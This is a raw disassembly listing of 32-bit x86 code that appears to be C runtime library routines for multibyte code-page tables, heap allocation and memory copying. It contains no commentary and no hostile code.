  4240d5:	lea    eax,[ebp-0x218]
  4240db:	push   esi
  4240dc:	push   eax
  4240dd:	push   esi
  4240de:	lea    eax,[ebp-0x118]
  4240e4:	push   eax
  4240e5:	push   esi
  4240e6:	push   DWORD PTR ds:0x45cf14
  4240ec:	call   0x425c1c
  4240f1:	push   0x0
  4240f3:	push   DWORD PTR ds:0x45d024
  4240f9:	lea    eax,[ebp-0x318]
  4240ff:	push   esi
  424100:	push   eax
  424101:	push   esi
  424102:	lea    eax,[ebp-0x118]
  424108:	push   eax
  424109:	push   0x200
  42410e:	push   DWORD PTR ds:0x45cf14
  424114:	call   0x425c1c
  424119:	add    esp,0x5c
  42411c:	xor    eax,eax
  42411e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  424126:	test   cl,0x1
  424129:	je     0x424141
  42412b:	or     BYTE PTR [eax+0x45cf21],0x10
  424132:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  424139:	mov    BYTE PTR [eax+0x45d040],cl
  42413f:	jmp    0x42415d
  424141:	test   cl,0x2
  424144:	je     0x424156
  424146:	or     BYTE PTR [eax+0x45cf21],0x20
  42414d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424154:	jmp    0x424139
  424156:	and    BYTE PTR [eax+0x45d040],0x0
  42415d:	inc    eax
  42415e:	cmp    eax,esi
  424160:	jb     0x42411e
  424162:	jmp    0x4241a8
  424164:	xor    eax,eax
  424166:	cmp    eax,0x41
  424169:	jb     0x424184
  42416b:	cmp    eax,0x5a
  42416e:	ja     0x424184
  424170:	or     BYTE PTR [eax+0x45cf21],0x10
  424177:	mov    cl,al
  424179:	add    cl,0x20
  42417c:	mov    BYTE PTR [eax+0x45d040],cl
  424182:	jmp    0x4241a3
  424184:	cmp    eax,0x61
  424187:	jb     0x42419c
  424189:	cmp    eax,0x7a
  42418c:	ja     0x42419c
  42418e:	or     BYTE PTR [eax+0x45cf21],0x20
  424195:	mov    cl,al
  424197:	sub    cl,0x20
  42419a:	jmp    0x42417c
  42419c:	and    BYTE PTR [eax+0x45d040],0x0
  4241a3:	inc    eax
  4241a4:	cmp    eax,esi
  4241a6:	jb     0x424166
  4241a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4241ab:	xor    ecx,DWORD PTR [ebp+0x4]
  4241ae:	pop    esi
  4241af:	call   0x423f7c
  4241b4:	leave  
  4241b5:	ret    
  4241b6:	push   ebp
  4241b7:	mov    ebp,esp
  4241b9:	sub    esp,0x1c
  4241bc:	mov    eax,ds:0x45c430
  4241c1:	xor    eax,DWORD PTR [ebp+0x4]
  4241c4:	push   ebx
  4241c5:	push   esi
  4241c6:	mov    esi,DWORD PTR [ebp+0x8]
  4241c9:	xor    ebx,ebx
  4241cb:	cmp    esi,ebx
  4241cd:	mov    DWORD PTR [ebp-0x4],eax
  4241d0:	push   edi
  4241d1:	je     0x42432b
  4241d7:	xor    edx,edx
  4241d9:	xor    eax,eax
  4241db:	cmp    DWORD PTR [eax+0x45c440],esi
  4241e1:	je     0x424248
  4241e3:	add    eax,0x30
  4241e6:	inc    edx
  4241e7:	cmp    eax,0xf0
  4241ec:	jb     0x4241db
  4241ee:	lea    eax,[ebp-0x1c]
  4241f1:	push   eax
  4241f2:	push   esi
  4241f3:	call   DWORD PTR ds:0x4280a4
  4241f9:	cmp    eax,0x1
  4241fc:	jne    0x424323
  424202:	push   0x40
  424204:	xor    eax,eax
  424206:	cmp    DWORD PTR [ebp-0x1c],0x1
  42420a:	pop    ecx
  42420b:	mov    edi,0x45cf20
  424210:	rep stos DWORD PTR es:[edi],eax
  424212:	stos   BYTE PTR es:[edi],al
  424213:	mov    DWORD PTR ds:0x45d024,esi
  424219:	mov    DWORD PTR ds:0x45cf14,ebx
  42421f:	jbe    0x424311
  424225:	cmp    BYTE PTR [ebp-0x16],0x0
  424229:	je     0x4242e9
  42422f:	lea    ecx,[ebp-0x15]
  424232:	mov    dl,BYTE PTR [ecx]
  424234:	test   dl,dl
  424236:	je     0x4242e9
  42423c:	movzx  eax,BYTE PTR [ecx-0x1]
  424240:	movzx  edx,dl
  424243:	jmp    0x4242d9
  424248:	push   0x40
  42424a:	xor    eax,eax
  42424c:	pop    ecx
  42424d:	mov    edi,0x45cf20
  424252:	rep stos DWORD PTR es:[edi],eax
  424254:	lea    ecx,[edx+edx*2]
  424257:	shl    ecx,0x4
  42425a:	mov    DWORD PTR [ebp-0x8],ebx
  42425d:	stos   BYTE PTR es:[edi],al
  42425e:	lea    ebx,[ecx+0x45c450]
  424264:	mov    al,BYTE PTR [ebx]
  424266:	mov    esi,ebx
  424268:	jmp    0x424293
  42426a:	mov    dl,BYTE PTR [esi+0x1]
  42426d:	test   dl,dl
  42426f:	je     0x424297
  424271:	movzx  eax,al
  424274:	movzx  edi,dl
  424277:	cmp    eax,edi
  424279:	ja     0x42428f
  42427b:	mov    edx,DWORD PTR [ebp-0x8]
  42427e:	mov    dl,BYTE PTR [edx+0x45c438]
  424284:	or     BYTE PTR [eax+0x45cf21],dl
  42428a:	inc    eax
  42428b:	cmp    eax,edi
  42428d:	jbe    0x424284
  42428f:	inc    esi
  424290:	inc    esi
  424291:	mov    al,BYTE PTR [esi]
  424293:	test   al,al
  424295:	jne    0x42426a
  424297:	inc    DWORD PTR [ebp-0x8]
  42429a:	add    ebx,0x8
  42429d:	cmp    DWORD PTR [ebp-0x8],0x4
  4242a1:	jb     0x424264
  4242a3:	mov    eax,DWORD PTR [ebp+0x8]
  4242a6:	mov    ds:0x45d024,eax
  4242ab:	mov    DWORD PTR ds:0x45cf1c,0x1
  4242b5:	call   0x423fcc
  4242ba:	lea    ecx,[ecx+0x45c444]
  4242c0:	mov    esi,ecx
  4242c2:	mov    edi,0x45d030
  4242c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	mov    ds:0x45cf14,eax
  4242ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242cf:	jmp    0x424330
  4242d1:	or     BYTE PTR [eax+0x45cf21],0x4
  4242d8:	inc    eax
  4242d9:	cmp    eax,edx
  4242db:	jbe    0x4242d1
  4242dd:	inc    ecx
  4242de:	inc    ecx
  4242df:	cmp    BYTE PTR [ecx-0x1],0x0
  4242e3:	jne    0x424232
  4242e9:	xor    ecx,ecx
  4242eb:	inc    ecx
  4242ec:	mov    eax,ecx
  4242ee:	or     BYTE PTR [eax+0x45cf21],0x8
  4242f5:	inc    eax
  4242f6:	cmp    eax,0xff
  4242fb:	jb     0x4242ee
  4242fd:	mov    eax,esi
  4242ff:	call   0x423fcc
  424304:	mov    ds:0x45cf14,eax
  424309:	mov    DWORD PTR ds:0x45cf1c,ecx
  42430f:	jmp    0x424317
  424311:	mov    DWORD PTR ds:0x45cf1c,ebx
  424317:	xor    eax,eax
  424319:	mov    edi,0x45d030
  42431e:	stos   DWORD PTR es:[edi],eax
  42431f:	stos   DWORD PTR es:[edi],eax
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	jmp    0x424330
  424323:	cmp    DWORD PTR ds:0x45cd84,ebx
  424329:	je     0x424339
  42432b:	call   0x423ffb
  424330:	call   0x424024
  424335:	xor    eax,eax
  424337:	jmp    0x42433c
  424339:	or     eax,0xffffffff
  42433c:	mov    ecx,DWORD PTR [ebp-0x4]
  42433f:	xor    ecx,DWORD PTR [ebp+0x4]
  424342:	pop    edi
  424343:	pop    esi
  424344:	pop    ebx
  424345:	call   0x423f7c
  42434a:	leave  
  42434b:	ret    
  42434c:	push   0x14
  42434e:	push   0x428558
  424353:	call   0x4238a8
  424358:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42435c:	push   0xd
  42435e:	call   0x423a6f
  424363:	pop    ecx
  424364:	xor    edi,edi
  424366:	mov    DWORD PTR [ebp-0x4],edi
  424369:	mov    DWORD PTR ds:0x45cd84,edi
  42436f:	mov    eax,DWORD PTR [ebp+0x8]
  424372:	cmp    eax,0xfffffffe
  424375:	jne    0x424389
  424377:	mov    DWORD PTR ds:0x45cd84,0x1
  424381:	call   DWORD PTR ds:0x4280a0
  424387:	jmp    0x4243b4
  424389:	cmp    eax,0xfffffffd
  42438c:	jne    0x4243a0
  42438e:	mov    DWORD PTR ds:0x45cd84,0x1
  424398:	call   DWORD PTR ds:0x42809c
  42439e:	jmp    0x4243b4
  4243a0:	cmp    eax,0xfffffffc
  4243a3:	jne    0x4243b4
  4243a5:	mov    DWORD PTR ds:0x45cd84,0x1
  4243af:	mov    eax,ds:0x45cdb4
  4243b4:	mov    DWORD PTR [ebp+0x8],eax
  4243b7:	cmp    eax,DWORD PTR ds:0x45d024
  4243bd:	je     0x42447e
  4243c3:	mov    esi,DWORD PTR ds:0x45cf18
  4243c9:	mov    DWORD PTR [ebp-0x20],esi
  4243cc:	cmp    esi,edi
  4243ce:	je     0x4243d4
  4243d0:	cmp    DWORD PTR [esi],edi
  4243d2:	je     0x4243e4
  4243d4:	push   0x220
  4243d9:	call   0x4245d2
  4243de:	pop    ecx
  4243df:	mov    esi,eax
  4243e1:	mov    DWORD PTR [ebp-0x20],esi
  4243e4:	cmp    esi,edi
  4243e6:	je     0x424467
  4243e8:	push   DWORD PTR [ebp+0x8]
  4243eb:	call   0x4241b6
  4243f0:	pop    ecx
  4243f1:	mov    DWORD PTR [ebp-0x1c],eax
  4243f4:	cmp    eax,edi
  4243f6:	jne    0x424467
  4243f8:	mov    DWORD PTR [esi],edi
  4243fa:	mov    eax,ds:0x45d024
  4243ff:	mov    DWORD PTR [esi+0x4],eax
  424402:	mov    eax,ds:0x45cf1c
  424407:	mov    DWORD PTR [esi+0x8],eax
  42440a:	mov    eax,ds:0x45cf14
  42440f:	mov    DWORD PTR [esi+0xc],eax
  424412:	xor    eax,eax
  424414:	mov    DWORD PTR [ebp-0x24],eax
  424417:	cmp    eax,0x5
  42441a:	jge    0x42442c
  42441c:	mov    cx,WORD PTR [eax*2+0x45d030]
  424424:	mov    WORD PTR [esi+eax*2+0x10],cx
  424429:	inc    eax
  42442a:	jmp    0x424414
  42442c:	xor    eax,eax
  42442e:	mov    DWORD PTR [ebp-0x24],eax
  424431:	cmp    eax,0x101
  424436:	jge    0x424445
  424438:	mov    cl,BYTE PTR [eax+0x45cf20]
  42443e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  424442:	inc    eax
  424443:	jmp    0x42442e
  424445:	xor    eax,eax
  424447:	mov    DWORD PTR [ebp-0x24],eax
  42444a:	cmp    eax,0x100
  42444f:	jge    0x424461
  424451:	mov    cl,BYTE PTR [eax+0x45d040]
  424457:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42445e:	inc    eax
  42445f:	jmp    0x424447
  424461:	mov    DWORD PTR ds:0x45cf18,esi
  424467:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42446b:	jne    0x424481
  42446d:	cmp    esi,DWORD PTR ds:0x45cf18
  424473:	je     0x424481
  424475:	push   esi
  424476:	call   0x4244ba
  42447b:	pop    ecx
  42447c:	jmp    0x424481
  42447e:	mov    DWORD PTR [ebp-0x1c],edi
  424481:	or     DWORD PTR [ebp-0x4],0xffffffff
  424485:	call   0x424493
  42448a:	mov    eax,DWORD PTR [ebp-0x1c]
  42448d:	call   0x4238e3
  424492:	ret    
  424493:	push   0xd
  424495:	call   0x4239db
  42449a:	pop    ecx
  42449b:	ret    
  42449c:	cmp    DWORD PTR ds:0x45d26c,0x0
  4244a3:	jne    0x4244b7
  4244a5:	push   0xfffffffd
  4244a7:	call   0x42434c
  4244ac:	pop    ecx
  4244ad:	mov    DWORD PTR ds:0x45d26c,0x1
  4244b7:	xor    eax,eax
  4244b9:	ret    
  4244ba:	push   0xc
  4244bc:	push   0x428568
  4244c1:	call   0x4238a8
  4244c6:	mov    esi,DWORD PTR [ebp+0x8]
  4244c9:	test   esi,esi
  4244cb:	je     0x424525
  4244cd:	cmp    DWORD PTR ds:0x45d144,0x3
  4244d4:	jne    0x424516
  4244d6:	push   0x4
  4244d8:	call   0x423a6f
  4244dd:	pop    ecx
  4244de:	and    DWORD PTR [ebp-0x4],0x0
  4244e2:	push   esi
  4244e3:	call   0x424c92
  4244e8:	pop    ecx
  4244e9:	mov    DWORD PTR [ebp-0x1c],eax
  4244ec:	test   eax,eax
  4244ee:	je     0x4244f9
  4244f0:	push   esi
  4244f1:	push   eax
  4244f2:	call   0x424cbd
  4244f7:	pop    ecx
  4244f8:	pop    ecx
  4244f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244fd:	call   0x42450d
  424502:	cmp    DWORD PTR [ebp-0x1c],0x0
  424506:	jne    0x424525
  424508:	push   DWORD PTR [ebp+0x8]
  42450b:	jmp    0x424517
  42450d:	push   0x4
  42450f:	call   0x4239db
  424514:	pop    ecx
  424515:	ret    
  424516:	push   esi
  424517:	push   0x0
  424519:	push   DWORD PTR ds:0x45d140
  42451f:	call   DWORD PTR ds:0x42808c
  424525:	call   0x4238e3
  42452a:	ret    
  42452b:	push   0xc
  42452d:	push   0x428578
  424532:	call   0x4238a8
  424537:	mov    esi,DWORD PTR [ebp+0x8]
  42453a:	cmp    DWORD PTR ds:0x45d144,0x3
  424541:	jne    0x424571
  424543:	cmp    esi,DWORD PTR ds:0x45cf04
  424549:	ja     0x424571
  42454b:	push   0x4
  42454d:	call   0x423a6f
  424552:	pop    ecx
  424553:	and    DWORD PTR [ebp-0x4],0x0
  424557:	push   esi
  424558:	call   0x425471
  42455d:	pop    ecx
  42455e:	mov    DWORD PTR [ebp-0x1c],eax
  424561:	or     DWORD PTR [ebp-0x4],0xffffffff
  424565:	call   0x42459d
  42456a:	mov    eax,DWORD PTR [ebp-0x1c]
  42456d:	test   eax,eax
  42456f:	jne    0x424594
  424571:	test   esi,esi
  424573:	jne    0x424576
  424575:	inc    esi
  424576:	cmp    DWORD PTR ds:0x45d144,0x1
  42457d:	je     0x424585
  42457f:	add    esi,0xf
  424582:	and    esi,0xfffffff0
  424585:	push   esi
  424586:	push   0x0
  424588:	push   DWORD PTR ds:0x45d140
  42458e:	call   DWORD PTR ds:0x4280a8
  424594:	call   0x4238e3
  424599:	ret    
  42459a:	mov    esi,DWORD PTR [ebp+0x8]
  42459d:	push   0x4
  42459f:	call   0x4239db
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4245ab:	ja     0x4245cf
  4245ad:	push   DWORD PTR [esp+0x4]
  4245b1:	call   0x42452b
  4245b6:	test   eax,eax
  4245b8:	pop    ecx
  4245b9:	jne    0x4245d1
  4245bb:	cmp    DWORD PTR [esp+0x8],eax
  4245bf:	je     0x4245d1
  4245c1:	push   DWORD PTR [esp+0x4]
  4245c5:	call   0x426192
  4245ca:	test   eax,eax
  4245cc:	pop    ecx
  4245cd:	jne    0x4245ad
  4245cf:	xor    eax,eax
  4245d1:	ret    
  4245d2:	push   DWORD PTR ds:0x45cdc8
  4245d8:	push   DWORD PTR [esp+0x8]
  4245dc:	call   0x4245a6
  4245e1:	pop    ecx
  4245e2:	pop    ecx
  4245e3:	ret    
  4245e4:	int3   
  4245e5:	int3   
  4245e6:	int3   
  4245e7:	int3   
  4245e8:	int3   
  4245e9:	int3   
  4245ea:	int3   
  4245eb:	int3   
  4245ec:	int3   
  4245ed:	int3   
  4245ee:	int3   
  4245ef:	int3   
  4245f0:	push   ebp
  4245f1:	mov    ebp,esp
  4245f3:	push   edi
  4245f4:	push   esi
  4245f5:	mov    esi,DWORD PTR [ebp+0xc]
  4245f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245fb:	mov    edi,DWORD PTR [ebp+0x8]
  4245fe:	mov    eax,ecx
  424600:	mov    edx,ecx
  424602:	add    eax,esi
  424604:	cmp    edi,esi
  424606:	jbe    0x424610
  424608:	cmp    edi,eax
  42460a:	jb     0x42478c
  424610:	test   edi,0x3
  424616:	jne    0x42462c
  424618:	shr    ecx,0x2
  42461b:	and    edx,0x3
  42461e:	cmp    ecx,0x8
  424621:	jb     0x42464c
  424623:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424625:	jmp    DWORD PTR [edx*4+0x42473c]
  42462c:	mov    eax,edi
  42462e:	mov    edx,0x3
  424633:	sub    ecx,0x4
  424636:	jb     0x424644
  424638:	and    eax,0x3
  42463b:	add    ecx,eax
  42463d:	jmp    DWORD PTR [eax*4+0x424650]
  424644:	jmp    DWORD PTR [ecx*4+0x42474c]
  42464b:	nop
  42464c:	jmp    DWORD PTR [ecx*4+0x4246d0]
  424653:	nop
  424654:	pusha  
  424655:	inc    esi
  424656:	inc    edx
  424657:	add    BYTE PTR [esi+eax*2+0x46b00042],cl
  42465e:	inc    edx
  42465f:	add    BYTE PTR [ebx],ah
  424661:	ror    DWORD PTR [edx-0x75f877fa],1
  424667:	inc    esi
  424668:	add    DWORD PTR [eax+0x468a0147],ecx
  42466e:	add    al,cl
  424670:	jmp    0x289ce77
  424675:	add    esi,0x3
  424678:	add    edi,0x3
  42467b:	cmp    ecx,0x8
  42467e:	jb     0x42464c
  424680:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	jmp    DWORD PTR [edx*4+0x42473c]
  424689:	lea    ecx,[ecx+0x0]
  42468c:	and    edx,ecx
  42468e:	mov    al,BYTE PTR [esi]
  424690:	mov    BYTE PTR [edi],al
  424692:	mov    al,BYTE PTR [esi+0x1]
  424695:	shr    ecx,0x2
  424698:	mov    BYTE PTR [edi+0x1],al
  42469b:	add    esi,0x2
  42469e:	add    edi,0x2
  4246a1:	cmp    ecx,0x8
  4246a4:	jb     0x42464c
  4246a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a8:	jmp    DWORD PTR [edx*4+0x42473c]
  4246af:	nop
  4246b0:	and    edx,ecx
  4246b2:	mov    al,BYTE PTR [esi]
  4246b4:	mov    BYTE PTR [edi],al
  4246b6:	add    esi,0x1
  4246b9:	shr    ecx,0x2
  4246bc:	add    edi,0x1
  4246bf:	cmp    ecx,0x8
  4246c2:	jb     0x42464c
  4246c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c6:	jmp    DWORD PTR [edx*4+0x42473c]
  4246cd:	lea    ecx,[ecx+0x0]
  4246d0:	xor    eax,DWORD PTR [edi+0x42]
  4246d3:	add    BYTE PTR [eax],ah
  4246d5:	inc    edi
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [eax],bl
  4246d9:	inc    edi
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dl
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [eax],cl
  4246e1:	inc    edi
  4246e2:	inc    edx
  4246e3:	add    BYTE PTR [eax],al
  4246e5:	inc    edi
  4246e6:	inc    edx
  4246e7:	add    al,bh
  4246e9:	inc    esi
  4246ea:	inc    edx
  4246eb:	add    al,dh
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246f5:	inc    esp
  4246f6:	(bad)  
  4246f7:	in     al,0x8b
  4246f9:	inc    esp
  4246fa:	mov    gs,eax
  4246fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424700:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424704:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424708:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42470c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424710:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424714:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424718:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42471c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  424720:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  424724:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  424728:	lea    eax,[ecx*4+0x0]
  42472f:	add    esi,eax
  424731:	add    edi,eax
  424733:	jmp    DWORD PTR [edx*4+0x42473c]
  42473a:	mov    edi,edi
  42473c:	dec    esp
  42473d:	inc    edi
  42473e:	inc    edx
  42473f:	add    BYTE PTR [edi+eax*2+0x42],dl
  424743:	add    BYTE PTR [eax+0x47],ah
  424746:	inc    edx
  424747:	add    BYTE PTR [edi+eax*2+0x42],dh
  42474b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424751:	leave  
  424752:	ret    
  424753:	nop
  424754:	mov    al,BYTE PTR [esi]
  424756:	mov    BYTE PTR [edi],al
  424758:	mov    eax,DWORD PTR [ebp+0x8]
  42475b:	pop    esi
  42475c:	pop    edi
  42475d:	leave  
  42475e:	ret    
  42475f:	nop
  424760:	mov    al,BYTE PTR [esi]
  424762:	mov    BYTE PTR [edi],al
  424764:	mov    al,BYTE PTR [esi+0x1]
  424767:	mov    BYTE PTR [edi+0x1],al
  42476a:	mov    eax,DWORD PTR [ebp+0x8]
  42476d:	pop    esi
  42476e:	pop    edi
  42476f:	leave  
  424770:	ret    
  424771:	lea    ecx,[ecx+0x0]
  424774:	mov    al,BYTE PTR [esi]
  424776:	mov    BYTE PTR [edi],al
  424778:	mov    al,BYTE PTR [esi+0x1]
  42477b:	mov    BYTE PTR [edi+0x1],al
  42477e:	mov    al,BYTE PTR [esi+0x2]
  424781:	mov    BYTE PTR [edi+0x2],al
  424784:	mov    eax,DWORD PTR [ebp+0x8]
  424787:	pop    esi
  424788:	pop    edi
  424789:	leave  
  42478a:	ret    
  42478b:	nop
  42478c:	lea    esi,[ecx+esi*1-0x4]
  424790:	lea    edi,[ecx+edi*1-0x4]
  424794:	test   edi,0x3
  42479a:	jne    0x4247c0
  42479c:	shr    ecx,0x2
  42479f:	and    edx,0x3
  4247a2:	cmp    ecx,0x8
  4247a5:	jb     0x4247b4
  4247a7:	std    
  4247a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247aa:	cld    
  4247ab:	jmp    DWORD PTR [edx*4+0x4248d8]
  4247b2:	mov    edi,edi
  4247b4:	neg    ecx
  4247b6:	jmp    DWORD PTR [ecx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    eax,edi
  4247c2:	mov    edx,0x3
  4247c7:	cmp    ecx,0x4
  4247ca:	jb     0x4247d8
  4247cc:	and    eax,0x3
  4247cf:	sub    ecx,eax
  4247d1:	jmp    DWORD PTR [eax*4+0x4247dc]
  4247d8:	jmp    DWORD PTR [ecx*4+0x4248d8]
  4247df:	nop
  4247e0:	in     al,dx
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],dl
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax],bh
  4247e9:	dec    eax
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247f1:	mov    BYTE PTR [edi+0x3],al
  4247f4:	sub    esi,0x1
  4247f7:	shr    ecx,0x2
  4247fa:	sub    edi,0x1
  4247fd:	cmp    ecx,0x8
  424800:	jb     0x4247b4
  424802:	std    
  424803:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424805:	cld    
  424806:	jmp    DWORD PTR [edx*4+0x4248d8]
  42480d:	lea    ecx,[ecx+0x0]
  424810:	mov    al,BYTE PTR [esi+0x3]
  424813:	and    edx,ecx
  424815:	mov    BYTE PTR [edi+0x3],al
  424818:	mov    al,BYTE PTR [esi+0x2]
  42481b:	shr    ecx,0x2
  42481e:	mov    BYTE PTR [edi+0x2],al
  424821:	sub    esi,0x2
  424824:	sub    edi,0x2
  424827:	cmp    ecx,0x8
  42482a:	jb     0x4247b4
  42482c:	std    
  42482d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482f:	cld    
  424830:	jmp    DWORD PTR [edx*4+0x4248d8]
  424837:	nop
  424838:	mov    al,BYTE PTR [esi+0x3]
  42483b:	and    edx,ecx
  42483d:	mov    BYTE PTR [edi+0x3],al
  424840:	mov    al,BYTE PTR [esi+0x2]
  424843:	mov    BYTE PTR [edi+0x2],al
  424846:	mov    al,BYTE PTR [esi+0x1]
  424849:	shr    ecx,0x2
  42484c:	mov    BYTE PTR [edi+0x1],al
  42484f:	sub    esi,0x3
  424852:	sub    edi,0x3
  424855:	cmp    ecx,0x8
  424858:	jb     0x4247b4
  42485e:	std    
  42485f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424861:	cld    
  424862:	jmp    DWORD PTR [edx*4+0x4248d8]
  424869:	lea    ecx,[ecx+0x0]
  42486c:	mov    WORD PTR [eax+0x42],cs
  42486f:	add    BYTE PTR [eax+ecx*2+0x489c0042],dl
  424876:	inc    edx
  424877:	add    BYTE PTR [eax+ecx*2+0x48ac0042],ah
  42487e:	inc    edx
  42487f:	add    BYTE PTR [eax+ecx*2+0x48bc0042],dh
  424886:	inc    edx
  424887:	add    bh,cl
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424891:	inc    esp
  424892:	(bad)  
  424893:	sbb    al,0x8b
  424895:	inc    esp
  424896:	mov    ds,WORD PTR [eax]
  424898:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42489c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4248a0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4248a4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4248a8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4248ac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4248b0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4248b4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4248b8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4248bc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4248c0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4248c4:	lea    eax,[ecx*4+0x0]
  4248cb:	add    esi,eax
  4248cd:	add    edi,eax
  4248cf:	jmp    DWORD PTR [edx*4+0x4248d8]
  4248d6:	mov    edi,edi
  4248d8:	call   0xf0428b25
  4248dd:	dec    eax
  4248de:	inc    edx
  4248df:	add    BYTE PTR [eax],al
  4248e1:	dec    ecx
  4248e2:	inc    edx
  4248e3:	add    BYTE PTR [ecx+ecx*2],dl
  4248e6:	inc    edx
  4248e7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4248ed:	leave  
  4248ee:	ret    
  4248ef:	nop
  4248f0:	mov    al,BYTE PTR [esi+0x3]
  4248f3:	mov    BYTE PTR [edi+0x3],al
  4248f6:	mov    eax,DWORD PTR [ebp+0x8]
  4248f9:	pop    esi
  4248fa:	pop    edi
  4248fb:	leave  
  4248fc:	ret    
  4248fd:	lea    ecx,[ecx+0x0]
  424900:	mov    al,BYTE PTR [esi+0x3]
  424903:	mov    BYTE PTR [edi+0x3],al
  424906:	mov    al,BYTE PTR [esi+0x2]
  424909:	mov    BYTE PTR [edi+0x2],al
  42490c:	mov    eax,DWORD PTR [ebp+0x8]
  42490f:	pop    esi
  424910:	pop    edi
  424911:	leave  
  424912:	ret    
  424913:	nop
  424914:	mov    al,BYTE PTR [esi+0x3]
  424917:	mov    BYTE PTR [edi+0x3],al
  42491a:	mov    al,BYTE PTR [esi+0x2]
  42491d:	mov    BYTE PTR [edi+0x2],al
  424920:	mov    al,BYTE PTR [esi+0x1]
  424923:	mov    BYTE PTR [edi+0x1],al
  424926:	mov    eax,DWORD PTR [ebp+0x8]
  424929:	pop    esi
  42492a:	pop    edi
  42492b:	leave  
  42492c:	ret    
  42492d:	push   DWORD PTR [esp+0x4]
  424931:	call   DWORD PTR ds:0x4280ac
  424937:	xor    eax,eax
  424939:	inc    eax
  42493a:	ret    0x8
  42493d:	push   0x10
  42493f:	push   0x4285c0
  424944:	call   0x4238a8
  424949:	mov    eax,ds:0x45cd88
  42494e:	test   eax,eax
  424950:	jne    0x424989
  424952:	cmp    DWORD PTR ds:0x45cac4,0x1
  424959:	je     0x42497f
  42495b:	push   0x4285ac
  424960:	call   DWORD PTR ds:0x428018
  424966:	test   eax,eax
  424968:	je     0x42497f
  42496a:	push   0x428584
  42496f:	push   eax
  424970:	call   DWORD PTR ds:0x42801c
  424976:	mov    ds:0x45cd88,eax
  42497b:	test   eax,eax
  42497d:	jne    0x424989
  42497f:	mov    eax,0x42492d
  424984:	mov    ds:0x45cd88,eax
  424989:	and    DWORD PTR [ebp-0x4],0x0
  42498d:	push   DWORD PTR [ebp+0xc]
  424990:	push   DWORD PTR [ebp+0x8]
  424993:	call   eax
  424995:	mov    DWORD PTR [ebp-0x1c],eax
  424998:	jmp    0x4249be
  42499a:	mov    eax,DWORD PTR [ebp-0x14]
  42499d:	mov    eax,DWORD PTR [eax]
  42499f:	mov    eax,DWORD PTR [eax]
  4249a1:	mov    DWORD PTR [ebp-0x20],eax
  4249a4:	xor    eax,eax
  4249a6:	inc    eax
  4249a7:	ret    
  4249a8:	mov    esp,DWORD PTR [ebp-0x18]
  4249ab:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  4249b2:	jne    0x4249bc
  4249b4:	push   0x8
  4249b6:	call   DWORD PTR ds:0x42806c
  4249bc:	xor    eax,eax
  4249be:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249c2:	call   0x4238e3
  4249c7:	ret    
  4249c8:	push   0x10
  4249ca:	push   0x4285d0
  4249cf:	call   0x4238a8
  4249d4:	mov    esi,DWORD PTR [ebp+0x8]
  4249d7:	imul   esi,DWORD PTR [ebp+0xc]
  4249db:	mov    DWORD PTR [ebp-0x1c],esi
  4249de:	test   esi,esi
  4249e0:	jne    0x4249e3
